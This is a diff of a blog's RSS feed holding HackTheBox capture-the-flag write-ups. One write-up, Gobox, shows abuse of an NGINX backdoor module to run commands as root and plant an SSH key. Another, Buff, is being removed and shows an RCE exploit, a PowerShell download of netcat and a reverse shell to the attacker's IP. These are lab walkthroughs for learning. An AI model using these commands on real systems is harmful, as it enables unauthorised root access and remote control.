+</span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
+<p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open and it&rsquo;s forbidden because the authorization check.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ nmap -sV -sC -p4566 10.10.11.113
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
+Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
+Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE VERSION
+4566/tcp open  http    nginx
+<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
+</code></pre></div><p>But if I add the authorization header, I get the following results:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbm
+</span><span class="s1">dFc3BvcnRz&#39;</span>
+*   Trying 10.10.11.113:4566...
+* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
+&gt; GET / HTTP/1.1
+&gt; Host: 10.10.11.113:4566
+&gt; User-Agent: curl/7.74.0
+&gt; Accept: */*
+&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span class="m">404</span>
+&lt; Server: nginx
+&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+&lt; Content-Length: <span class="m">21</span>
+&lt; Connection: keep-alive
+&lt; access-control-allow-origin: *
+&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
+&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
+&lt; access-control-expose-headers: x-amz-version-id
+&lt;
+* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
+<span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
+</code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
+<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>When I try to interact with it, it returns nothing.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
+www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
+curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
+</code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
+Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
+/
+HTTP/1.1 <span class="m">400</span> Bad Request
+Server: nginx
+Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
+Content-Type: text/html
+Content-Length: <span class="m">150</span>
+Connection: close
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on Aug. 26 at the same time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -lt
+total <span class="m">64</span>
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
+</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name, &ldquo;backdoor&rdquo;!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
+total <span class="m">12</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
+</code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
+load_module modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
+/usr/lib/nginx/modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
+/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
+</code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
+$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
+ngx_pcalloc
+__ctype_b_loc
+realloc
+malloc
+ngxexecute_strncpy_alloc
+ngxexecute_strcpy_alloc
+~iHc
+/home/ubuntu/NginxExecute//ngx_result.c
+7src
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
+<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
+*   Trying 127.0.0.1:8000...
+* TCP_NODELAY <span class="nb">set</span>
+* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
+&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
+&gt; Host: 127.0.0.1:8000
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt;
+* Empty reply from server
+* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
+curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
+</code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
+$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
+ippsec.run
+</code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
+root
+</code></pre></div><p>Using the previous reverse shell script on <code>/tmp/</code>, I could get an interactive shell access as root, but then the shell gets exited by itself.</p>
+<p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
+</p>
+<p>So instead, I will inject my SSH public key.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
+www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
+</code></pre></div><p>Now I can SSH login as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ ssh root@10.10.11.113
+Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC
+
+  System load:                      0.0
+  Usage of /:                       37.1% of 9.72GB
+  Memory usage:                     20%
+  Swap usage:                       0%
+  Processes:                        <span class="m">244</span>
+  Users logged in:                  <span class="m">0</span>
+  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
+  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
+  IPv4 address <span class="k">for</span> ens160:          10.10.11.113
+
+
+<span class="m">0</span> updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for</span> new updates run: sudo apt update
+
+Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
+root@gobox:~#
+</code></pre></div><p>And I can grab the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# ls -l
+total <span class="m">12</span>
+-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
+-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
+drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
+root@gobox:~# cat root.txt
+81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h2 id="explore">Explore</h2>
+<h3 id="undetected-ports">Undetected ports</h3>
+<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
+</code></pre></div><p>It turns out there is a set of <code>iptables</code> rules that drop any connection coming to these ports.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# iptables -L
+Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
+target     prot opt <span class="nb">source</span>               destination         
+ACCEPT     all  --  localhost/8          anywhere            
+ACCEPT     all  --  172.16.0.0/12        anywhere            
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>Shouldn&rsquo;t it then return with <code>filtered</code> status?</p>
+<p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
+<h3 id="gobox-request-routing">Gobox Request Routing</h3>
+<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
+<p>Now, with root access obtained, I could understand what was happening, and it was synchronization.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
+/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
+/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
+</code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
+<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
+<p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
+</p>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - TheNotebook</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</link>
@@ -1437,295 +2002,6 @@ Mode                LastWriteTime         Length Name
 <li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
 <li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
 <li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Buff</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</link>
-      <pubDate>Sat, 01 May 2021 16:30:16 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</guid>
-      <description>Modifying a buffer overflow PoC and use it over Chisel tunnel</description>
-      <content:encoded><![CDATA[<p>Buff is a Windows machine with easy difficulty  from HackTheBox that features an open source web application called &ldquo;Gym Management System&rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Gym Management System 1.0 Exploitation</li>
-<li>Port Forwarding</li>
-<li>CloudMe 1.12 Exploitation</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap - Preinstalled in Kali Linux</li>
-<li>searchsploit/Exploit-DB - Preinstalled in Kali Linux</li>
-<li><a href="https://github.com/jpillora/chisel/releases">chisel</a></li>
-<li>msfvenom - Preinstalled in Kali Linux</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>An initial scan with <code>nmap</code> only discovers one port open on 8080 running an Apache web server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.18»
-$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198
-
-PORT     STATE SERVICE VERSION
-8080/tcp open  http    Apache httpd 2.4.43 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6<span class="o">)</span>
-<span class="p">|</span> http-methods:
-<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
-<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
-<span class="p">|</span>_http-server-header: Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6
-<span class="p">|</span>_http-title: mrb3n’s Bro Hut
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
-<p>Visiting port 8080 displays a website for a Gym, on the title it is called &ldquo;mrb3n&rsquo;s Bro Hut&rdquo;.</p>
-<p><img src="imgs/image-20210502140814680.png" alt="image-20210502140814680" style="zoom: 67%;" /></p>
-<p>Clicking on the contact page discovers the name of the software behind this web application.</p>
-<p><img src="imgs/image-20210502140846741.png" alt="image-20210502140846741" style="zoom:67%;" /></p>
-<h4 id="searchsploit">Searchsploit</h4>
-<p>I can feed the software name to <code>searchsploit</code>. It shows several exploits, and one that stands out is the remote code execution.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «machines» «10.10.14.18»
-$ searchsploit Gym Management System 1.0
-------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                 <span class="p">|</span>  Path
-------------------------------------------------------------------------------- ---------------------------------
-Gym Management System 1.0 - <span class="s1">&#39;id&#39;</span> SQL Injection                                 <span class="p">|</span> php/webapps/48936.txt
-Gym Management System 1.0 - Authentication Bypass                              <span class="p">|</span> php/webapps/48940.txt
-Gym Management System 1.0 - Stored Cross Site Scripting                        <span class="p">|</span> php/webapps/48941.txt
-Gym Management System 1.0 - Unauthenticated Remote Code Execution              <span class="p">|</span> php/webapps/48506.py
-------------------------------------------------------------------------------- ---------------------------------
-</code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-shaun">Shell as shaun</h3>
-<p><code>searchsploit -m</code> allows me to mirror/make a copy of the &ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution&rdquo; exploit to the current working directory</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploit» «10.10.14.18»
-$ searchsploit -m <span class="m">48506</span>
-  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
-      URL: https://www.exploit-db.com/exploits/48506
-     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
-File Type: Python script, ASCII text executable, with CRLF line terminators
-
-Copied to: /root/htb/machines/buff/exploit/48506.py
-
-
-→ root@kali «exploit» «10.10.14.18»
-$ ls -l
-total <span class="m">8</span>
--rwxr-xr-x <span class="m">1</span> root root <span class="m">5164</span> May  <span class="m">2</span> 04:29 48506.py
-</code></pre></div><p>I’ll rename <code>48506.py</code> to <code>exploit.py</code>, and run it afterwards.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploit» «10.10.14.18»
-$ python exploit.py http://10.10.10.198:8080/
-</code></pre></div><p><img src="imgs/image-20210502153153898.png" alt="image-20210502153153898" style="zoom:67%;" /></p>
-<p>With current pseudo shell access, I can&rsquo;t change my directory but I can still grab the user flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\s</span>haun<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
-</code></pre></div><h4 id="upgrade-to-interactive-shell">Upgrade to Interactive Shell</h4>
-<p>To make the shell a bit more comfy, I uploaded a <code>netcat</code> using <code>powershell</code> to Buff, and then I&rsquo;ll create another reverse shell session.</p>
-<p>First, I&rsquo;ll host the 64 bit netcat, <code>nc64.exe</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «buff» «10.10.14.18»
-$ python -m http.server <span class="m">80</span>
-Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-10.10.10.198 - - <span class="o">[</span>14/Aug/2020 10:11:02<span class="o">]</span> <span class="s2">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span class="m">200</span>
-</code></pre></div><p>On Buff, I&rsquo;ll grab the hosted <code>nc64.exe</code> using PowerShell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">C:</span><span class="p">\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe&#34;</span>
-</code></pre></div><p>Now I&rsquo;ll setup a listener on my Kali, and send a reverse shell from Buff using the downloaded <code>nc.exe</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;.<span class="se">\n</span>c.exe -e cmd.exe 10.10.14.18 <span class="m">9001</span>
-</code></pre></div><p>I have a &ldquo;proper&rdquo; shell now</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «buff» «10.10.14.18»
-$ nc -nvlp <span class="m">9001</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
-connect to <span class="o">[</span>10.10.14.18<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.198<span class="o">]</span> <span class="m">64518</span>
-Microsoft Windows <span class="o">[</span>Version 10.0.17134.1550<span class="o">]</span>  
-<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.   
-
-C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt;
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-administrator">Shell as Administrator</h3>
-<h4 id="enumeration-1">Enumeration</h4>
-<p>After enumerating the Users folder, I noticed a slightly different output when typing the <code>dir</code> command in <code>shaun</code> home directory.</p>
-<p><div class="img-container"><img src="imgs/image-20210502155544622.png" alt="image-20210502155544622"  /></div>
-</p>
-<p>In the Download folder, there is an executable file called <code>CloudMe_1112.exe</code> where 1112 is likely a version number.</p>
-<p>Checking on currently running services with <code>netstat</code> discovers.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; netstat -aonp tcp
-Active Connections
-
-  Proto  Local Address          Foreign Address        State           PID
-
-...&lt;SNIP&gt;...
-  TCP    127.0.0.1:8888            0.0.0.0:0              LISTENING       <span class="m">7352</span>
-...&lt;SNIP&gt;...  
-</code></pre></div><p>I can search the program name using the <code>tasklist</code> command.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\g</span>ym<span class="se">\u</span>pload&gt; tasklist /FI “PID eq 7352<span class="s2">&#34; /v /FO list
-</span></code></pre></div><p><img src="imgs/image-20210502160832477.png" alt="image-20210502160832477" style="zoom:67%;" /></p>
-<p>So PID 7352 on port 8888 is running <code>CloudMe.exe</code>.</p>
-<p>Because the user name field is showing as <strong>N/A</strong>, one possible thing is that I don’t have enough privilege to dig for more information about the process because it might be running with a higher privilege (either administrator or a local system).</p>
-<h4 id="searchsploit-1">Searchsploit</h4>
-<p>A quick search about &ldquo;CloudMe&rdquo; on <code>searchsploit</code> pops several buffer overflow exploits with four of them are exact match.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «buff» «10.10.14.18»
-$ searchsploit CloudMe
-------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                 <span class="p">|</span>  Path
